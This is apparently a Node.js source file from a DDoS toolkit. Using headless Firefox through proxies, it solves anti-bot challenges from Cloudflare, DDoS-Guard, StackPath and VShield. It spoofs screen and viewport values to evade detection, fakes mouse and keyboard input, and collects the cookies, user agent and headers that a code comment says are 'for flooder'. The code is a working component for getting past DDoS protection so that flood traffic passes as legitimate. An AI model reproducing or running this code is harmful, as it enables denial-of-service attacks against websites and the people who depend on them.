const playwright = require('playwright-extra');
const iPhone = playwright.devices['iPhone 12'];

const colors = require('colors');
const url = require('url');

require('log-timestamp')( () => {
  return "\033[38;5;199m" + new Date().toISOString()
}); // for better logs


process.on('uncaughtException', function (er) {
  //console.log(er);
});
process.on('unhandledRejection', function (er) {
  //console.log(er);
});

const susDetection = {
  "js": [{
    "name": "GameSense",
    "navigations": 1,
    "locate": "<title>GameSense</title>"
  },
  {
    "name": "StackPath",
    "navigations": 1,
    "locate": 'function genPid()'
  }, {
    "name": "CloudFlare",
    "navigations": 2,
    "locate": "<h2 class=\"h2\" id=\"challenge-running\">"
  }, {
    "name": "React",
    "navigations": 1,
    "locate": "Check your browser..."
  }, {
    "name": "DDoS-Guard",
    "navigations": 1,
    "locate": "DDoS protection by DDos-Guard"
  }, {
    "name": "CF-UAM",
    "navigations": 1,
    "locate": "<title>Just a moment...</title>"
  }, {
    "name": "VShield",
    "navigations": 1,
    "locate": `<script src="https://fw.vshield.pro/v2/bot-detector.js"></script>`
  }, {
    "name": "VShield v2",
    "navigations": 1,
    "locate": "https://fw.vshield.pro/v2/bot-detector.js"
  }
  ]

}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function log(string) {
  let d = new Date();
  let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
  let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
  let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
  console.log(`(${hours}:${minutes}:${seconds}) ${string}`);
}

function cookiesToStr(cookies) {
  if (Array.isArray(cookies)) {
    return cookies.reduce((prev, {
      name,
      value
    }) => {
      if (!prev) return `${name}=${value}`;
      return `${prev}; ${name}=${value}`;
    }, "");
    return "";
  }
}

function findJs(argument) {
  for (let i = 0; i < susDetection['js'].length; i++) {
    if (argument.includes(susDetection['js'][i].locate)) {
      return susDetection['js'][i]
    }
  }
}

function solverInstance(args) {
  return new Promise((resolve, reject) => {

    playwright.firefox.launch({
      headless: true,
      proxy: {
        server: "http://" + args.Proxy
      }
    }).then(async (browser) => {
      console.log('[Browser] '.magenta + `New instance `.red + `| ${args.ua}`.yellow) 

      const page = await browser.newPage({
        userAgent: args.ua
      });

      /*
        - Spoofing Baloo Detections
      */
      await page.addInitScript(() => {

        /** Fixed ViewPort detection */
        Object.defineProperty(screen, 'width', {
          get: () => 1366
        })

        Object.defineProperty(screen, 'height', {
          get: () => 768
        })

        Object.defineProperty(window, 'innerWidth', {
          get: () => 760
        })

        Object.defineProperty(window, 'outerHeight', {
          get: () => 738
        })

        Object.defineProperty(visualViewport, 'width', {
          get: () => 760
        })

        Object.defineProperty(visualViewport, 'height', {
          get: () => 667
        })
        /** End of Fix ViewPort detection */
      })

      await page.setViewportSize({
        width: 1366,
        height: 768
      })

      /*
        - END of Spoofing Baloo Detections
      */

      var headers;

      try {
        const headeri = await page.on('request', req => {

          /* Getting headers for flooder. */
          headerConstant = req.allHeaders().then((e) => {
            headers = e
          });

          /* Fixing Bug */
          headers.host = url.parse(args.Target).host
          console.log('[Browser] '.magenta + `Got headers for TLS mode... `.red + `| Host: ${headers.host}`.magenta) 
        })

        await page.goto(args.Target);

        console.log('[Browser] '.magenta + `New User-Agent `.red + `| ${args.ua}`.magenta) 

      } catch (e) {
        console.log('[Browser] '.magenta + `Failed with ${args.proxy}`.red + `| ${e}`.magenta)

        await browser.close();
        reject(e);
      }

      const source = await page.content();
      const JS = await findJs(source);


      if (JS) {
        console.log('[Browser] '.magenta + `New Challenge `.red + `| ${JS.name}`.magenta)

        if (JS.name == "VShield") {

          await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
          await page.mouse.down();
          await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
          await page.mouse.up();
          await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
          await page.mouse.down();
          await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
          await page.mouse.up();
          await page.keyboard.press('Enter');
          await page.keyboard.press('1');
          await page.keyboard.press('R');

        }

        for (let i = 0; i < JS.navigations; i++) {
          var [response] = await Promise.all([
            page.waitForNavigation({
              waitUntil: 'domcontentloaded',
              timeout: 15000
            }),
          ])

          console.log('[Browser] '.magenta + `New Navigation `.red + `| ${i}/${JS.navigations}`.magenta)
        }
      } else {
        console.log('[Browser] '.magenta + `Not JS/Captcha `.red)
      }

      const source2 = await page.content();
      const JS2 = await findJs(source2);


      if (JS2) {
        console.log('[Browser] '.magenta + `New Challenge `.red + `| ${JS2.name}`.magenta)

        if (JS2.name == "VShield") {

          await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
          await page.mouse.down();
          await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
          await page.mouse.up();
          await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
          await page.mouse.down();
          await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
          await page.mouse.up();
          await page.keyboard.press('Enter');
          await page.keyboard.press('1');
          await page.keyboard.press('R');
        }

        for (let i = 0; i < JS2.navigations; i++) {
          var [response] = await Promise.all([
            page.waitForNavigation({
              waitUntil: 'domcontentloaded',
              timeout: 15000
            }),
          ])

          console.log('[Browser] '.magenta + `New Navigation `.red + `| ${i}/${JS2.navigations}`.magenta)
        }
      };

      const cookies = cookiesToStr(await page.context().cookies());
      const titleParsed = await page.title();
      if (titleParsed == "405 Not Allowed") {
        await browser.close();
        reject(`pizda`);
      };

      console.log('[Browser] '.magenta + `New cookies `.red + `| ${cookies}`.magenta)
      console.log('[Browser] '.magenta + `New Title `.red + `| ${titleParsed}`.magenta)

      await page.screenshot({ path: 'bxvtest2.png' });

      var object = {
        ua: args.ua,
        proxy: args.Proxy,
        cookie: cookies,
        headers: headers
      }
      await browser.close();
      resolve(object);
    })
  })
}

/*

Отче наш
Отче наш, Иже еси на небесех!
Да святится имя Твое,
да приидет Царствие Твое,
да будет воля Твоя,
яко на небеси и на земли.
Хлеб наш насущный даждь нам днесь;
и остави нам долги наша,
якоже и мы оставляем должником нашим;
и не введи нас во искушение,
но избави нас от лукаваго.

АМИНЬ АМИНЬ АМИНЬ

*/
module.exports = {
  solverInstance: solverInstance
};  